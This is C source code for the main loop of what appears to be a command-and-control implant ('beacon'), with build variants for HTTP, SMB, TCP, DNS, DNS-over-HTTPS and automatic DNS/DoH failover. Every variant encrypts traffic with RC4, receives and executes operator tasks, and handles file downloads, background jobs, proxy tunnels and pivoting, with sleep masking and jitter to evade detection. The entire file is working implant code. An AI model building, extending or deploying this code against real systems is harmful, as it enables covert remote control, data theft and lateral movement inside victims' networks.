#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"

Agent* g_Agent;

#if defined(BEACON_HTTP) 

#include "ConnectorHTTP.h"
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) 
		return;

	g_Agent = new Agent();
	g_Connector = new ConnectorHTTP();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if ( !g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize) )
		return;

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			
			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		}
		else {
			g_Connector->SendData(NULL, 0);
		}

		if ( g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4( g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16 );
			g_Agent->commander->ProcessCommandTasks( g_Connector->RecvData(), g_Connector->RecvSize(), packerOut );
		}
		g_Connector->RecvClear();


		if (g_Agent->IsActive() && packerOut->datasize() < 8 )
			WaitMask(g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );

		g_Agent->downloader->ProcessDownloader(packerOut);			
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while ( g_Agent->IsActive() );

	g_Agent->commander->Exit(packerOut);

	packerOut->Set32(0, packerOut->datasize());

	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_SMB) 

#include "ConnectorSMB.h"
ConnectorSMB* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = new Agent();
	g_Connector = new ConnectorSMB();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();

		g_Connector->SendData(beat, beatSize);

		while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {

    		if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}

			if (g_Connector->RecvSize() == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
				TEB->LastErrorValue = 0;
				break;
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_TCP)

#include "ConnectorTCP.h"
ConnectorTCP* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = new Agent();
	g_Connector = new ConnectorTCP();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();

		g_Connector->SendData(beat, beatSize);

		while (g_Connector->RecvSize() >= 0 && g_Agent->IsActive()) {

			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	delete packerOut;

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_DNS)

#include "ConnectorDNS.h"
#include "DnsCompression.h"
ConnectorDNS* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorDNS*)MemAllocLocal(sizeof(ConnectorDNS));
	if (!g_Connector)
		return;
	*g_Connector = ConnectorDNS();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize, g_Agent->config->sleep_delay))
		return;

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	BYTE* pendingUpload = NULL;
	ULONG pendingUploadSize = 0;
	ULONG uploadBackoffMs = 0;
	ULONG nextUploadAttemptTick = 0;

	do {
		if (pendingUpload && pendingUploadSize) {
			ULONG now = GetTickCount();
			if (now >= nextUploadAttemptTick) {
				g_Connector->SendData(pendingUpload, pendingUploadSize);
				if (g_Connector->WasLastQueryOk()) {
					MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
					pendingUpload = NULL;
					pendingUploadSize = 0;
					uploadBackoffMs = 0;
					nextUploadAttemptTick = 0;
				} else {
					ULONG base = uploadBackoffMs ? uploadBackoffMs : 500;
					ULONG next = base * 2;
					if (next > 30000) next = 30000;
					uploadBackoffMs = next;
					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
				}
			} else {
				g_Connector->SendData(NULL, 0);
			}
		} else if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());
			BYTE* plainBuf = packerOut->data();
			ULONG plainLen = packerOut->datasize();

			BYTE* sessionBuf = NULL;
			ULONG sessionLen = 0;
			BYTE* payload = plainBuf;
			ULONG payloadLen = plainLen;
			BYTE flags = 0;

			const ULONG minCompressSize = 2048;
			if (payloadLen > minCompressSize) {
				BYTE* compBuf = NULL;
				ULONG compLen = 0;
				if (DeflateCompress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
					payload = compBuf;
					payloadLen = compLen;
					flags = 1;
				}
			}

			sessionLen = 1 + 4 + payloadLen;
			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
			if (sessionBuf) {
				sessionBuf[0] = flags;
				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
				memcpy(sessionBuf + 5, payload, payloadLen);
			}

			BYTE* sendBuf = NULL;
			ULONG sendLen = 0;
			if (!sessionBuf) {
				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
				sendBuf = plainBuf;
				sendLen = plainLen;
				g_Connector->SendData(sendBuf, sendLen);
			} else {
				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
				sendBuf = sessionBuf;
				sendLen = sessionLen;
				g_Connector->SendData(sendBuf, sendLen);
			}

			if (!g_Connector->WasLastQueryOk() && sendBuf && sendLen) {
				pendingUpload = (BYTE*)MemAllocLocal(sendLen);
				if (pendingUpload) {
					memcpy(pendingUpload, sendBuf, sendLen);
					pendingUploadSize = sendLen;
					uploadBackoffMs = uploadBackoffMs ? uploadBackoffMs : 500;
					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
				}
			}
			if (sessionBuf) {
				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
			}
			if (flags & 0x1 && payload && payload != plainBuf) {
				MemFreeLocal((LPVOID*)&payload, payloadLen);
			}

			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		} else {
			g_Connector->SendData(NULL, 0);
		}

		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
		}
		g_Connector->RecvClear();

		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
			ULONG baseSleep = g_Agent->config->sleep_delay;
			ULONG jitter = g_Agent->config->jitter_delay;
			BOOL burst = FALSE;
			if (g_Connector->IsBusy() || (g_Connector->GetLastUpTotal() >= (1 * 1024)) || (g_Connector->GetLastDownTotal() >= (1 * 1024))) {
				burst = TRUE;
			}
			if (burst) {
				mySleep(50);
				g_Connector->ResetTrafficTotals();
			} else {
				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
			}
		}

		g_Agent->downloader->ProcessDownloader(packerOut);
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while (g_Agent->IsActive());

	g_Agent->commander->Exit(packerOut);
	packerOut->Set32(0, packerOut->datasize());
	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	if (pendingUpload && pendingUploadSize) {
		MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
	}

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_DOH)

#include "ConnectorDoH.h"
#include "DnsCompression.h"
ConnectorDoH* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorDoH*)MemAllocLocal(sizeof(ConnectorDoH));
	if (!g_Connector)
		return;
	*g_Connector = ConnectorDoH();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize, g_Agent->config->sleep_delay))
		return;

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	BYTE* pendingUpload = NULL;
	ULONG pendingUploadSize = 0;
	ULONG uploadBackoffMs = 0;
	ULONG nextUploadAttemptTick = 0;

	do {
		if (pendingUpload && pendingUploadSize) {
			ULONG now = GetTickCount();
			if (now >= nextUploadAttemptTick) {
				g_Connector->SendData(pendingUpload, pendingUploadSize);
				if (g_Connector->WasLastQueryOk()) {
					MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
					pendingUpload = NULL;
					pendingUploadSize = 0;
					uploadBackoffMs = 0;
					nextUploadAttemptTick = 0;
				} else {
					ULONG base = uploadBackoffMs ? uploadBackoffMs : 500;
					ULONG next = base * 2;
					if (next > 30000) next = 30000;
					uploadBackoffMs = next;
					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
				}
			} else {
				g_Connector->SendData(NULL, 0);
			}
		} else if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());
			BYTE* plainBuf = packerOut->data();
			ULONG plainLen = packerOut->datasize();

			BYTE* sessionBuf = NULL;
			ULONG sessionLen = 0;
			BYTE* payload = plainBuf;
			ULONG payloadLen = plainLen;
			BYTE flags = 0;

			const ULONG minCompressSize = 2048;
			if (payloadLen > minCompressSize) {
				BYTE* compBuf = NULL;
				ULONG compLen = 0;
				if (DeflateCompress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
					payload = compBuf;
					payloadLen = compLen;
					flags = 1;
				}
			}

			sessionLen = 1 + 4 + payloadLen;
			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
			if (sessionBuf) {
				sessionBuf[0] = flags;
				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
				memcpy(sessionBuf + 5, payload, payloadLen);
			}

			BYTE* sendBuf = NULL;
			ULONG sendLen = 0;
			if (!sessionBuf) {
				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
				sendBuf = plainBuf;
				sendLen = plainLen;
				g_Connector->SendData(sendBuf, sendLen);
			} else {
				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
				sendBuf = sessionBuf;
				sendLen = sessionLen;
				g_Connector->SendData(sendBuf, sendLen);
			}

			if (!g_Connector->WasLastQueryOk() && sendBuf && sendLen) {
				pendingUpload = (BYTE*)MemAllocLocal(sendLen);
				if (pendingUpload) {
					memcpy(pendingUpload, sendBuf, sendLen);
					pendingUploadSize = sendLen;
					uploadBackoffMs = uploadBackoffMs ? uploadBackoffMs : 500;
					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
				}
			}
			if (sessionBuf) {
				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
			}
			if (flags & 0x1 && payload && payload != plainBuf) {
				MemFreeLocal((LPVOID*)&payload, payloadLen);
			}

			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		} else {
			g_Connector->SendData(NULL, 0);
		}

		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
		}
		g_Connector->RecvClear();

		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
			ULONG baseSleep = g_Agent->config->sleep_delay;
			ULONG jitter = g_Agent->config->jitter_delay;
			BOOL burst = FALSE;
			if (g_Connector->IsBusy() || (g_Connector->GetLastUpTotal() >= (1 * 1024)) || (g_Connector->GetLastDownTotal() >= (1 * 1024))) {
				burst = TRUE;
			}
			if (burst) {
				mySleep(50);
				g_Connector->ResetTrafficTotals();
			} else {
				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
			}
		}

		g_Agent->downloader->ProcessDownloader(packerOut);
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while (g_Agent->IsActive());

	g_Agent->commander->Exit(packerOut);
	packerOut->Set32(0, packerOut->datasize());
	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	if (pendingUpload && pendingUploadSize) {
		MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
	}

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_DNS_DOH)

#include "ConnectorDNS.h"
#include "ConnectorDoH.h"
#include "DnsCompression.h"
ConnectorDNS* g_DnsConnector;
ConnectorDoH* g_DohConnector;

#define TX_SEND(data, size)    (useDns ? g_DnsConnector->SendData((data), (size))      : g_DohConnector->SendData((data), (size)))
#define TX_SIZE()              (useDns ? g_DnsConnector->RecvSize()                    : g_DohConnector->RecvSize())
#define TX_DATA()              (useDns ? g_DnsConnector->RecvData()                    : g_DohConnector->RecvData())
#define TX_CLEAR()             (useDns ? g_DnsConnector->RecvClear()                   : g_DohConnector->RecvClear())
#define TX_IS_BUSY()           (useDns ? g_DnsConnector->IsBusy()                      : g_DohConnector->IsBusy())
#define TX_LAST_UP()           (useDns ? g_DnsConnector->GetLastUpTotal()              : g_DohConnector->GetLastUpTotal())
#define TX_LAST_DOWN()         (useDns ? g_DnsConnector->GetLastDownTotal()            : g_DohConnector->GetLastDownTotal())
#define TX_RESET_TOTALS()      (useDns ? g_DnsConnector->ResetTrafficTotals()          : g_DohConnector->ResetTrafficTotals())
#define TX_LAST_OK()           (useDns ? g_DnsConnector->WasLastQueryOk()              : g_DohConnector->WasLastQueryOk())

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_DnsConnector = (ConnectorDNS*)MemAllocLocal(sizeof(ConnectorDNS));
	if (!g_DnsConnector)
		return;
	*g_DnsConnector = ConnectorDNS();

	g_DohConnector = (ConnectorDoH*)MemAllocLocal(sizeof(ConnectorDoH));
	if (!g_DohConnector)
		return;
	*g_DohConnector = ConnectorDoH();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if (!g_DnsConnector->SetConfig(g_Agent->config->profile.dns, beat, beatSize, g_Agent->config->sleep_delay))
		return;
	if (!g_DohConnector->SetConfig(g_Agent->config->profile.doh, beat, beatSize, g_Agent->config->sleep_delay))
		return;

	BOOL useDns = TRUE;
	BOOL autoMode = FALSE;
	ULONG dnsFailCount = 0;
	ULONG dohFailCount = 0;
	const ULONG kFailThreshold = 3;

	BYTE* mode = g_Agent->config->profile.mode;
	if (mode) {
		if (lstrcmpiA((CHAR*)mode, "doh") == 0) {
			useDns = FALSE;
		} else if (lstrcmpiA((CHAR*)mode, "dns") == 0) {
			useDns = TRUE;
		} else if (lstrcmpiA((CHAR*)mode, "auto") == 0) {
			useDns = TRUE;
			autoMode = TRUE;
		}
	}

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	BYTE* pendingUpload = NULL;
	ULONG pendingUploadSize = 0;
	ULONG uploadBackoffMs = 0;
	ULONG nextUploadAttemptTick = 0;

	do {
		if (pendingUpload && pendingUploadSize) {
			ULONG now = GetTickCount();
			if (now >= nextUploadAttemptTick) {
				TX_SEND(pendingUpload, pendingUploadSize);
				if (TX_LAST_OK()) {
					MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
					pendingUpload = NULL;
					pendingUploadSize = 0;
					uploadBackoffMs = 0;
					nextUploadAttemptTick = 0;
				} else {
					ULONG base = uploadBackoffMs ? uploadBackoffMs : 500;
					ULONG next = base * 2;
					if (next > 30000) next = 30000;
					uploadBackoffMs = next;
					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
				}
			} else {
				TX_SEND(NULL, 0);
			}
		} else if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());
			BYTE* plainBuf = packerOut->data();
			ULONG plainLen = packerOut->datasize();

			BYTE* sessionBuf = NULL;
			ULONG sessionLen = 0;
			BYTE* payload = plainBuf;
			ULONG payloadLen = plainLen;
			BYTE flags = 0;

			const ULONG minCompressSize = 2048;
			if (payloadLen > minCompressSize) {
				BYTE* compBuf = NULL;
				ULONG compLen = 0;
				if (DeflateCompress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
					payload = compBuf;
					payloadLen = compLen;
					flags = 1;
				}
			}

			sessionLen = 1 + 4 + payloadLen;
			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
			if (sessionBuf) {
				sessionBuf[0] = flags;
				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
				memcpy(sessionBuf + 5, payload, payloadLen);
			}

			BYTE* sendBuf = NULL;
			ULONG sendLen = 0;
			if (!sessionBuf) {
				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
				sendBuf = plainBuf;
				sendLen = plainLen;
				TX_SEND(sendBuf, sendLen);
			} else {
				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
				sendBuf = sessionBuf;
				sendLen = sessionLen;
				TX_SEND(sendBuf, sendLen);
			}

			if (!TX_LAST_OK() && sendBuf && sendLen) {
				pendingUpload = (BYTE*)MemAllocLocal(sendLen);
				if (pendingUpload) {
					memcpy(pendingUpload, sendBuf, sendLen);
					pendingUploadSize = sendLen;
					uploadBackoffMs = uploadBackoffMs ? uploadBackoffMs : 500;
					nextUploadAttemptTick = GetTickCount() + uploadBackoffMs + (GetTickCount() & 0x3FF);
				}
			}
			if (sessionBuf) {
				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
			}
			if (flags & 0x1 && payload && payload != plainBuf) {
				MemFreeLocal((LPVOID*)&payload, payloadLen);
			}

			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		} else {
			TX_SEND(NULL, 0);
		}

		if (TX_SIZE() && TX_DATA()) {
			DecryptRC4(TX_DATA(), TX_SIZE(), g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(TX_DATA(), TX_SIZE(), packerOut);
		}
		TX_CLEAR();

		// Auto failover logic
		if (autoMode) {
			if (TX_LAST_OK()) {
				if (useDns) dnsFailCount = 0;
				else dohFailCount = 0;
			} else {
				if (useDns) {
					dnsFailCount++;
					if (dnsFailCount >= kFailThreshold) {
						useDns = FALSE;
						dnsFailCount = 0;
					}
				} else {
					dohFailCount++;
					if (dohFailCount >= kFailThreshold) {
						useDns = TRUE;
						dohFailCount = 0;
					}
				}
			}
		}

		// Update resolvers/URLs if changed
		{
			BYTE* dnsResolvers = g_Agent->config->profile.dns.resolvers;
			if (dnsResolvers && dnsResolvers != (BYTE*)g_DnsConnector->GetResolvers()) {
				g_DnsConnector->UpdateResolvers(dnsResolvers);
			}
			BYTE* dohUrls = g_Agent->config->profile.doh.urls;
			if (dohUrls && dohUrls != (BYTE*)g_DohConnector->GetUrls()) {
				g_DohConnector->UpdateUrls(dohUrls);
			}
		}

		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
			ULONG baseSleep = g_Agent->config->sleep_delay;
			ULONG jitter = g_Agent->config->jitter_delay;
			BOOL burst = FALSE;
			if (TX_IS_BUSY() || (TX_LAST_UP() >= (1 * 1024)) || (TX_LAST_DOWN() >= (1 * 1024))) {
				burst = TRUE;
			}
			if (burst) {
				mySleep(50);
				TX_RESET_TOTALS();
			} else {
				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
			}
		}

		g_Agent->downloader->ProcessDownloader(packerOut);
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while (g_Agent->IsActive());

	g_Agent->commander->Exit(packerOut);
	packerOut->Set32(0, packerOut->datasize());
	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
	TX_SEND(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	TX_CLEAR();

	if (pendingUpload && pendingUploadSize) {
		MemFreeLocal((LPVOID*)&pendingUpload, pendingUploadSize);
	}

	g_DnsConnector->CloseConnector();
	g_DohConnector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}

#endif

void AgentClear(int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
